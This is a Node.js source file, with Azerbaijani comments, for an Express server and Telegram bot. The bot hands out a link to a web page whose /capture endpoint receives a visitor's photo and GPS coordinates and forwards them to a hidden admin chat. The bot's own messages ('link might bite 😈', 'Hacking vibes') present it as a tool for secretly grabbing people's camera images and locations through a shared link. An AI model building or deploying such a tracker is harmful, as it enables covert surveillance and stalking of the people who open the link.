const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = process.env.BOT_TOKEN; // Render-də ENV dəyişən
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // Render-də ENV dəyişən

const WEBAPP_URL = 'https://photo-location-bot.onrender.com'; // Render linki

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();
const upload = multer({ dest: 'uploads/' });

app.use(express.static('public'));

// Capture endpoint
app.post('/capture', upload.single('photo'), async (req, res) => {
    try {
        const { latitude, longitude } = req.body;
        if (!latitude || !longitude) return res.status(400).json({ ok: false, error: 'Missing location' });

        const savedDir = path.join(__dirname, 'saved_photos');
        if (!fs.existsSync(savedDir)) fs.mkdirSync(savedDir, { recursive: true });

        let savedFile = null;
        if (req.file) {
            const newName = Date.now() + '-' + req.file.originalname;
            const newPath = path.join(savedDir, newName);
            fs.renameSync(req.file.path, newPath);
            savedFile = newPath;
        }

        const caption = `📍 Yeni məlumat:\nLat: ${latitude}, Lng: ${longitude}\n⏰ ${new Date().toISOString()}`;

        if (savedFile) {
            await bot.sendPhoto(ADMIN_CHAT_ID, fs.createReadStream(savedFile), { caption });
        } else {
            await bot.sendMessage(ADMIN_CHAT_ID, caption);
        }

        res.json({ ok: true });
    } catch (err) {
        res.status(500).json({ ok: false, error: err.message });
    }
});

// Telegram Bot komandaları
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "👋 Xoş gəlmisən! Bu bot test məqsədilə işləyir.", {
        reply_markup: {
            keyboard: [
                [{ text: "📎 Link al" }, { text: "ℹ️ Haqqında" }]
            ],
            resize_keyboard: true,
            one_time_keyboard: false
        }
    });
});

bot.on("message", (msg) => {
    const chatId = msg.chat.id;
    if (msg.text === "📎 Link al") {
        bot.sendMessage(chatId, `⚡ Ehtiyatlı ol, link dişləməsin 😈\n👉 ${WEBAPP_URL}`);
    }
    if (msg.text === "ℹ️ Haqqında") {
        bot.sendMessage(chatId, "🤖 Bu bot səninlə sadəcə test üçündür.\nHacking vibes 💻⚡");
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => console.log(`✅ Server port ${PORT}-da işləyir`));
